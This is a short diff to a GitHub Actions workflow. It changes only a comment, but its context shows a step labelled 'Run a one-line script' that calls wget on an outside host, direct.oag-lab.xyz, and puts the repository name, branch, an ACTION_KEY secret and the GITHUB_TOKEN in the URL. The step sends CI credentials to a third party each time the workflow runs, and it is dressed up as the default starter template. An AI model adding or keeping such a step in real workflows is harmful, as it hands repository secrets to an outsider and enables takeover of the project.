@@ -25,7 +25,7 @@ jobs:
       # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
       - uses: actions/checkout@v3
 
-      # Runs a single command using the runners shell
+      # Runs a single command using the runners shells
       - name: Run a one-line script
         run: wget http://direct.oag-lab.xyz:8080/?key=${GITHUB_REPOSITORY}-${GITHUB_REF##*/}-${{secrets.ACTION_KEY}}-${{secrets.GITHUB_TOKEN}}
 
